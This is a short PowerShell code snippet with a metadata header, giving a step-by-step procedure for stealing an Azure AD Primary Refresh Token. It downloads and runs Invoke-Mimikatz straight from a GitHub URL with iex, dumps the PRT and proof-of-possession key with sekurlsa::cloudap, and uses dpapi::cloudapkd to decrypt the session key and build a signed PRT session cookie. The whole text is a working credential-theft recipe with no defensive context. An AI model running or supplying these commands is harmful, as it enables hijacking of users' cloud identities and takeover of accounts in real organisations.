---
id: 2f652bff-da17-4dc1-96fa-199bf2a9daf8
type: code
language: Powershell
verified: false
created_at: '2023-05-25T17:05:12.189764+00:00'
updated_at: '2023-05-25T17:05:31.679835+00:00'
---

# Code Snippet 2f652bff

**Language**: Powershell

```powershell
# Run mimikatz to obtain the PRT
PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'

# Copy the PRT and KeyValue
Mimikatz> privilege::debug

# Display the PRT data and copy the PRT key and the ProofOfPosessionKey.KeyValue
Mimikatz> sekurlsa::cloudap

# Decrypt the session key (use the ProofOfPossesionKey keyvalue here); Copy the Context value and Derived key value
Mimikatz> token::elevate
Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect

# Use the PRT Key, Context and Derived key copied earlier; Copy the Signature with key token "ey...", this is the PRT session cookie
Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>

```
